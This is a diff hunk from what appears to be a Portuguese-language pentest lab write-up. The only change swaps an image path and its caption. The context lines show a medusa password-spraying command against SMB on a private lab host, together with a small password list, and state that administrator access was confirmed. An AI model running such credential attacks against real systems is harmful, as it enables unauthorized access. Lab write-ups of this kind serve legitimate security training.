@@ -200,7 +200,7 @@ echo -e "password\n123456\nWelcome123\nmsfadmin" > smb_pass.txt
 medusa -h 192.168.56.101 -U smb_users.txt -P smb_pass.txt -M smbnt -t 2 -T 50
 ```
 
-![Password spraying SMB](images/12.passwordsprayngcommedusa.png)
+![spraying SMB](imagens/smb.png)
 *Execução de password spraying no serviço SMB — acesso de administrador confirmado*
 
 ### ✔️ Resultado
